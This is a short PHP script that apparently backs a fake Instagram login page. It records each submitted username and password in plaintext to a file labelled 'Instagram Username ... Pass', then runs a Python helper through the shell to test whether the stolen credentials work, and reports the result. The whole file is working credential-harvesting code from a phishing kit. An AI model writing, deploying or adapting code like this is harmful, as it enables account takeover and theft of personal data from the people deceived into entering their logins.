<?php

$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);

if (empty($username) || empty($password)) {

    echo json_encode([
        'success' => false,
        'message' => 'Username and password are required'
    ]);

    exit();
}

$command =
    'python3 login.py '
    . escapeshellarg($username) . ' '
    . escapeshellarg($password)
    . ' 2>&1';

$output = shell_exec($command);

file_put_contents(
    'php_debug.txt',
    $output . PHP_EOL,
    FILE_APPEND
);

$result = trim($output);

if (strpos($result, 'true') !== false) {

    echo json_encode([
        'success' => true,
        'message' => 'Login true',
        'output' => $output
    ]);

} else {

    echo json_encode([
        'success' => false,
        'message' => 'Login failed',
        'output' => $output
    ]);
}

exit();
?>


